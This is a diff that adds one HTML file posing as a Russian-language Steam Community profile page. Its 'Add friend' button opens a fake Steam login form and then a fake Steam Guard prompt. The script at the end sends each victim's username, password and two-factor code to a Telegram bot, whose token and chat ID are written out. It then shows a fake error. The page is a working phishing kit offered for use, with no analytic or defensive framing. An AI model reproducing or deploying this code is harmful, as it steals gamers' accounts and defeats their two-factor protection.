@@ -1,0 +1,1045 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="ru" class="responsive DesktopUI">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="theme-color" content="#171a21">
+    <title>Профиль CyberGhost :: Steam Сообщество</title>
+    <link rel="shortcut icon" href="https://steamcommunity.com/favicon.ico" type="image/x-icon">
+    <style>
+        /* Все оригинальные стили Steam */
+        body {
+            background: #1b2838;
+            color: #fff;
+            font-family: "Motiva Sans", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            font-size: 14px;
+        }
+        
+        .responsive_page_frame {
+            max-width: 940px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        /* Header Styles */
+        #global_header {
+            background: #171a21;
+            padding: 6px 0;
+        }
+        
+        #global_header .content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 940px;
+            margin: 0 auto;
+            padding: 0 10px;
+        }
+        
+        #global_header .logo img {
+            height: 44px;
+        }
+        
+        .supernav_container {
+            display: flex;
+        }
+        
+        .menuitem.supernav {
+            color: #b8b6b4;
+            text-decoration: none;
+            padding: 10px 15px;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+        
+        .menuitem.supernav:hover {
+            color: #fff;
+        }
+        
+        #global_actions {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header_installsteam_btn {
+            background: #5c7e10;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 2px;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+        
+        /* Profile Header */
+        .profile_header_bg {
+            background: linear-gradient(135deg, rgba(62, 126, 172, 0.8) 0%, rgba(82, 156, 206, 0.8) 100%);
+            padding: 20px 0;
+        }
+        
+        .profile_header {
+            max-width: 940px;
+            margin: 0 auto;
+            padding: 0 10px;
+        }
+        
+        .profile_header_content {
+            display: flex;
+            align-items: center;
+        }
+        
+        .playerAvatar.profile_header_size {
+            width: 184px;
+            height: 184px;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-right: 20px;
+            border: 2px solid #90ba3c;
+        }
+        
+        .playerAvatar img {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .profile_header_centered_col {
+            flex-grow: 1;
+        }
+        
+        .persona_name {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .header_real_name {
+            color: #c7d5e0;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .profile_header_status {
+            color: #c7d5e0;
+            font-style: italic;
+            margin-bottom: 10px;
+        }
+        
+        .profile_header_badgeinfo {
+            text-align: right;
+        }
+        
+        .friendPlayerLevel {
+            background: #4c6b22;
+            color: #c5f017;
+            border-radius: 2px;
+            padding: 4px 6px;
+            display: inline-block;
+            font-weight: bold;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+        
+        .profile_header_actions {
+            margin-top: 10px;
+        }
+        
+        .btn_profile_action {
+            background: linear-gradient(to bottom, #a4d007 5%, #536904 95%);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 2px;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+        }
+        
+        /* Profile Content */
+        .profile_content {
+            max-width: 940px;
+            margin: 20px auto;
+            padding: 0 10px;
+            display: flex;
+        }
+        
+        .profile_leftcol {
+            width: 616px;
+            margin-right: 20px;
+        }
+        
+        .profile_rightcol {
+            width: 304px;
+        }
+        
+        .profile_customization {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 3px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .profile_recentgame_header {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .recentgame_quicklinks {
+            font-size: 12px;
+            color: #8f98a0;
+        }
+        
+        .recent_game {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        
+        .game_info_cap {
+            width: 184px;
+            height: 69px;
+            margin-right: 10px;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        
+        .game_info_cap img {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .game_name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .game_info_details {
+            font-size: 12px;
+            color: #8f98a0;
+        }
+        
+        .responsive_status_info {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 3px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .profile_in_game {
+            margin-bottom: 10px;
+        }
+        
+        .profile_in_game_header {
+            font-weight: bold;
+            color: #c5c3c0;
+        }
+        
+        .profile_count_link {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 10px;
+            color: #c7d5e0;
+            text-decoration: none;
+            border-radius: 3px;
+        }
+        
+        .profile_count_link:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .count_link_label {
+            flex-grow: 1;
+        }
+        
+        .count_link_value {
+            color: #8f98a0;
+            font-weight: bold;
+        }
+        
+        /* Login Page Styles */
+        .page_content {
+            max-width: 940px;
+            margin: 0 auto;
+            padding: 20px 10px;
+        }
+        
+        .login_container {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 3px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .login_form {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .login_form_header {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .input_row {
+            margin-bottom: 15px;
+        }
+        
+        .input_label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .input_field {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid #4c6379;
+            border-radius: 3px;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        
+        .checkbox_row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .checkbox_field {
+            margin-right: 10px;
+        }
+        
+        .btn_login {
+            background: linear-gradient(to bottom, #a4d007 5%, #536904 95%);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 2px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .login_help_link {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: #67c1f5;
+            text-decoration: none;
+        }
+        
+        .login_bottom_row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .login_btn_ctn {
+            flex: 1;
+        }
+        
+        .headline {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .login_create_btn {
+            background: linear-gradient(to bottom, #67c1f5 5%, #3a5e80 95%);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 2px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .subtext {
+            color: #8f98a0;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .about_link {
+            color: #67c1f5;
+            text-decoration: none;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: #1b2838;
+            border: 1px solid #4c6379;
+            border-radius: 3px;
+            width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal-header {
+            border-bottom: 1px solid #4c6379;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #c7d5e0;
+        }
+        
+        .modal-body {
+            margin-bottom: 20px;
+        }
+        
+        .modal-body p {
+            color: #8f98a0;
+            margin-bottom: 15px;
+        }
+        
+        .modal_buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .auth_button {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid #4c6379;
+            border-radius: 3px;
+            padding: 10px 15px;
+            color: #c7d5e0;
+            cursor: pointer;
+            text-align: center;
+            flex: 1;
+            margin: 0 5px;
+        }
+        
+        .auth_button:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .auth_button_h3 {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .auth_button_h5 {
+            font-size: 12px;
+            color: #8f98a0;
+        }
+        
+        /* Footer */
+        #footer {
+            background: #171a21;
+            padding: 20px 0;
+            margin-top: 40px;
+        }
+        
+        .footer_content {
+            max-width: 940px;
+            margin: 0 auto;
+            padding: 0 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        #footerLogo img {
+            height: 26px;
+            margin-right: 15px;
+        }
+        
+        #footerText {
+            color: #8f98a0;
+            font-size: 12px;
+        }
+        
+        .valve_links a {
+            color: #c7d5e0;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .valve_links a:hover {
+            color: #fff;
+        }
+
+        /* Mobile Header */
+        .responsive_header {
+            display: none;
+            background: #171a21;
+            padding: 10px;
+            position: relative;
+        }
+        
+        .responsive_header_content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        #responsive_menu_logo {
+            width: 30px;
+            height: 30px;
+            cursor: pointer;
+        }
+        
+        .responsive_header_logo img {
+            height: 30px;
+        }
+        
+        /* Mobile Navigation */
+        .responsive_page_menu_ctn {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #171a21;
+            z-index: 10000;
+            overflow-y: auto;
+        }
+        
+        .responsive_page_menu {
+            padding: 20px;
+        }
+        
+        .mainmenu_contents_items {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .menuitem {
+            padding: 15px 10px;
+            color: #b8b6b4;
+            text-decoration: none;
+            border-bottom: 1px solid #2a2d2e;
+        }
+        
+        /* Mobile Adaptations */
+        @media (max-width: 910px) {
+            .responsive_page_frame {
+                width: 100%;
+                padding: 0 10px;
+            }
+            
+            #global_header {
+                display: none;
+            }
+            
+            .responsive_header {
+                display: block;
+            }
+            
+            .profile_header_content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .playerAvatar.profile_header_size {
+                width: 124px;
+                height: 124px;
+                margin: 0 auto 15px;
+            }
+            
+            .profile_header_badgeinfo {
+                text-align: center;
+                margin-top: 15px;
+            }
+            
+            .profile_content {
+                flex-direction: column;
+            }
+            
+            .profile_leftcol, .profile_rightcol {
+                width: 100%;
+                margin-right: 0;
+            }
+            
+            .recent_game {
+                flex-direction: column;
+            }
+            
+            .game_info_cap {
+                width: 100%;
+                height: auto;
+                margin-right: 0;
+                margin-bottom: 10px;
+            }
+            
+            .game_info_cap img {
+                width: 100%;
+                height: auto;
+            }
+            
+            .modal-content {
+                width: 90%;
+                margin: 20% auto;
+            }
+            
+            .login_bottom_row {
+                flex-direction: column;
+            }
+            
+            .login_btn_ctn {
+                margin-bottom: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .persona_name {
+                font-size: 20px;
+            }
+            
+            .profile_recentgame_header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .recentgame_quicklinks {
+                margin-top: 10px;
+            }
+            
+            .btn_profile_action {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+            
+            .login_form_header {
+                font-size: 16px;
+            }
+            
+            .headline {
+                font-size: 16px;
+            }
+            
+            .login_create_btn {
+                padding: 8px 16px;
+            }
+            
+            .modal_buttons {
+                flex-direction: column;
+            }
+            
+            .auth_button {
+                margin: 5px 0;
+            }
+        }
+
+        /* Touch device optimizations */
+        @media (hover: none) and (pointer: coarse) {
+            .btn_profile_action, .btn_login, .auth_button {
+                min-height: 44px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            
+            .input_field {
+                min-height: 44px;
+                font-size: 16px; /* Prevents zoom on iOS */
+            }
+            
+            .checkbox_field {
+                transform: scale(1.5);
+                margin-right: 15px;
+            }
+        }
+    </style>
+    <script>
+        // Определение типа устройства
+        function detectDevice() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isTablet = /iPad|Android|Tablet/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
+            
+            if (isMobile || isTablet) {
+                document.documentElement.classList.add('mobile-device');
+                if (isMobile) document.documentElement.classList.add('phone');
+                if (isTablet) document.documentElement.classList.add('tablet');
+                
+                // Оптимизации для мобильных устройств
+                const viewport = document.querySelector('meta[name="viewport"]');
+                if (viewport) {
+                    viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
+                }
+            }
+        }
+        
+        // Адаптация изображений под экран
+        function optimizeImages() {
+            const images = document.querySelectorAll('img');
+            const screenWidth = window.innerWidth;
+            
+            images.forEach(img => {
+                if (screenWidth < 480) {
+                    // Для маленьких экранов
+                    if (img.classList.contains('playerAvatar')) {
+                        img.style.maxWidth = '124px';
+                        img.style.height = 'auto';
+                    }
+                }
+                
+                // Добавляем lazy loading для мобильных устройств
+                if ('loading' in HTMLImageElement.prototype) {
+                    img.setAttribute('loading', 'lazy');
+                }
+            });
+        }
+        
+        // Инициализация при загрузке
+        window.addEventListener('DOMContentLoaded', function() {
+            detectDevice();
+            optimizeImages();
+            
+            // Обработка мобильного меню
+            const menuButton = document.getElementById('responsive_menu_logo');
+            const menuContainer = document.getElementById('responsive_page_menu');
+            
+            if (menuButton && menuContainer) {
+                menuButton.addEventListener('click', function() {
+                    menuContainer.style.display = menuContainer.style.display === 'block' ? 'none' : 'block';
+                });
+            }
+        });
+        
+        // Ресайз окна
+        window.addEventListener('resize', optimizeImages);
+    </script>
+</head>
+<body class="login global responsive_page">
+    <!-- Mobile Header -->
+    <div class="responsive_header">
+        <div class="responsive_header_content">
+            <div id="responsive_menu_logo">
+                <img src="https://community.akamai.steamstatic.com/public/images/hamburger_menu_icon.png" width="30" height="30" alt="Menu">
+            </div>
+            <div class="responsive_header_logo">
+                <a href="#">
+                    <img src="https://store.steampowered.com/public/shared/images/header/logo_steam.svg" height="30" alt="STEAM">
+                </a>
+            </div>
+            <div style="width: 30px;"></div> <!-- For balance -->
+        </div>
+    </div>
+
+    <!-- Mobile Menu -->
+    <div class="responsive_page_menu_ctn" id="responsive_page_menu" style="display: none;">
+        <div class="responsive_page_menu">
+            <div class="mainmenu_contents">
+                <div class="mainmenu_contents_items">
+                    <a class="menuitem" href="#">Магазин</a>
+                    <a class="menuitem" href="#">Сообщество</a>
+                    <a class="menuitem" href="#">Профиль</a>
+                    <a class="menuitem" href="#">Чат</a>
+                    <a class="menuitem" href="#">Поддержка</a>
+                    <a class="menuitem" href="#">Войти</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Desktop Header -->
+    <div role="banner" id="global_header">
+        <div class="content">
+            <div class="logo">
+                <a href="#">
+                    <img src="https://store.steampowered.com/public/shared/images/header/logo_steam.svg" alt="Steam">
+                </a>
+            </div>
+            <div role="navigation" class="supernav_container" aria-label="Глобальное меню">
+                <a class="menuitem supernav" href="#">МАГАЗИН</a>
+                <a class="menuitem supernav" href="#">СООБЩЕСТВО</a>
+                <a class="menuitem supernav" href="#">CyberGhost</a>
+                <a class="menuitem supernav" href="#">ЧАТ</a>
+                <a class="menuitem supernav" href="#">ПОДДЕРЖКА</a>
+            </div>
+            <div id="global_actions">
+                <a class="header_installsteam_btn" href="#">
+                    <div class="header_installsteam_btn_content">Установить Steam</div>
+                </a>
+                <a class="global_action_link" href="#">войти</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="profile_header_bg">
+        <div class="profile_header">
+            <div class="profile_header_content">
+                <div class="playerAvatar profile_header_size">
+                    <img src="https://avatars.akamai.steamstatic.com/e73bc1294742adda1348138143498d39eb5f8037_full.jpg" alt="CyberGhost">
+                </div>
+                <div class="profile_header_centered_col">
+                    <div class="profile_header_centered_persona">
+                        <div class="persona_name">
+                            <span class="actual_persona_name">CyberGhost</span>
+                        </div>
+                        <div class="header_real_name">
+                            Уровень 28 | Не в сети
+                        </div>
+                        <div class="profile_header_status">
+                            Уезжаю на неделю сразу после релиза силксонга приятной игры!
+                        </div>
+                    </div>
+                </div>
+                <div class="profile_header_badgeinfo">
+                    <div class="persona_level_btn">
+                        <div class="persona_name persona_level">Уровень <div class="friendPlayerLevel"><span class="friendPlayerLevelNum">28</span></div></div>
+                    </div>
+                    <div class="profile_header_actions">
+                        <button class="btn_profile_action" onclick="showLoginPage()">
+                            <span>Добавить в друзья</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="profile_content">
+        <div class="profile_leftcol">
+            <div class="profile_customization">
+                <div class="profile_recentgame_header">
+                    <div>Недавняя активность</div>
+                    <div class="recentgame_quicklinks">
+                        3,4 ч. за последние 2 недели
+                    </div>
+                </div>
+                <div class="recent_games">
+                    <div class="recent_game">
+                        <div class="game_info_cap">
+                            <img src="https://cdn.akamai.steamstatic.com/steam/apps/730/capsule_184x69.jpg" alt="Counter-Strike 2">
+                        </div>
+                        <div class="game_info_details">
+                            <div class="game_name">Counter-Strike 2</div>
+                            <div>1 ч. всего</div>
+                            <div>последний запуск 28 авг</div>
+                        </div>
+                    </div>
+                    <div class="recent_game">
+                        <div class="game_info_cap">
+                            <img src="https://cdn.akamai.steamstatic.com/steam/apps/480/capsule_184x69.jpg" alt="Spacewar">
+                        </div>
+                        <div class="game_info_details">
+                            <div class="game_name">Spacewar</div>
+                            <div>2,4 ч. всего</div>
+                            <div>последний запуск 24 авг</div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <div class="recentgame_quicklinks">
+                        <a href="#">Все недавно запущенные</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="profile_rightcol">
+            <div class="responsive_status_info">
+                <div class="profile_in_game persona">
+                    <div class="profile_in_game_header">Не в сети</div>
+                </div>
+            </div>
+            <div class="responsive_count_link_area">
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Награды профиля</span>
+                    <span class="count_link_value">4</span>
+                </a>
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Значки</span>
+                    <span class="count_link_value">20</span>
+                </a>
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Друзья</span>
+                    <span class="count_link_value">28</span>
+                </a>
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Инвентарь</span>
+                </a>
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Скриншоты</span>
+                    <span class="count_link_value">2</span>
+                </a>
+                <a class="profile_count_link" href="#">
+                    <span class="count_link_label">Обзоры</span>
+                    <span class="count_link_value">3</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Page (hidden by default) -->
+    <div id="loginPage" class="page_content" style="display: none;">
+        <div class="login_container">
+            <div class="login_form">
+                <div class="login_form_header">Вход</div>
+                <form id="loginForm">
+                    <div class="input_row">
+                        <div class="input_label">Войдите, используя имя аккаунта</div>
+                        <input type="text" class="input_field" id="username" required>
+                    </div>
+                    <div class="input_row">
+                        <div class="input_label">Пароль</div>
+                        <input type="password" class="input_field" id="password" required>
+                    </div>
+                    <div class="checkbox_row">
+                        <input type="checkbox" class="checkbox_field" id="remember_login">
+                        <label for="remember_login">Запомнить меня</label>
+                    </div>
+                    <button type="submit" class="btn_login">Войти</button>
+                    <a href="#" class="login_help_link">Помогите, я не могу войти в аккаунт</a>
+                </form>
+            </div>
+        </div>
+
+        <div class="login_bottom_row">
+            <div class="login_btn_ctn">
+                <div class="headline">Первый раз в Steam?</div>
+                <a href="#" class="login_create_btn">
+                    <span>Создать аккаунт</span>
+                </a>
+            </div>
+            <div class="login_btn_ctn">
+                <div class="subtext">
+                    Это бесплатно и просто. Откройте для себя тысячи игр, в которые можно играть с миллионами новых друзей.
+                    <a href="#" class="about_link">Узнайте больше о Steam</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Steam Guard Modal -->
+    <div id="guardModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Steam Guard</div>
+            </div>
+            <div class="modal-body">
+                <p>Введите код, отправленный на вашу электронную почту:</p>
+                <form id="guardForm">
+                    <div class="input_row">
+                        <input type="text" class="input_field" id="authCode" placeholder="Код подтверждения" required>
+                    </div>
+                    <div class="modal_buttons">
+                        <button type="submit" class="auth_button">
+                            <div class="auth_button_h3">Подтвердить</div>
+                            <div class="auth_button_h5">код аутентификатора</div>
+                        </button>
+                        <div class="auth_button" onclick="showHelp()">
+                            <div class="auth_button_h3">Помогите,</div>
+                            <div class="auth_button_h5">у меня больше нет доступа к кодам аутентификатора</div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Ошибка</div>
+            </div>
+            <div class="modal-body">
+                <p>Неверный код подтверждения. Пожалуйста, попробуйте еще раз.</p>
+                <div class="modal_buttons">
+                    <button class="auth_button" onclick="hideModal('errorModal')">
+                        <div class="auth_button_h3">OK</div>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="footer">
+        <div class="footer_content">
+            <span id="footerLogo">
+                <img src="https://store.steampowered.com/public/shared/images/logo_valve_footer.png" alt="Valve">
+            </span>
+            <span id="footerText">
+                © Valve Corporation. Все права сохранены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.
+                <span class="valve_links">
+                    <a href="#">Политика конфиденциальности</a> | <a href="#">Правовая информация</a> | <a href="#">Соглашение подписчика Steam</a> | <a href="#">Возврат средств</a>
+                </span>
+            </span>
+        </div>
+    </div>
+
+    <script>
+        function showLoginPage() {
+            document.getElementById('loginPage').style.display = 'block';
+            document.querySelector('.profile_content').style.display = 'none';
+            document.querySelector('.profile_header_bg').style.display = 'none';
+            window.scrollTo(0, 0);
+        }
+        
+        function hideModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        function showHelp() {
+            alert('Для помощи обратитесь в поддержку Steam.');
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Отправка данных через Telegram
+            const token = '8218964077:AAF7tjLhM3SRQWiypFzjc9uoXM7WdzjO5Co';
+            const chatId = '7798775068';
+            const message = `Steam Login: ${username}:${password}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            // Показываем окно Steam Guard
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('guardModal').style.display = 'block';
+        });
+        
+        document.getElementById('guardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const authCode = document.getElementById('authCode').value;
+            
+            // Отправка кода
+            const token = '8218964077:AAF7tjLhM3SRQWiypFzjc9uoXM7WdzjO5Co';
+            const chatId = '7798775068';
+            const message = `Steam Guard Code: ${authCode}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            // Показываем ошибку
+            document.getElementById('guardModal').style.display = 'none';
+            document.getElementById('errorModal').style.display = 'block';
+        });
+        
+        // Закрытие модальных окон при клике вне их
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
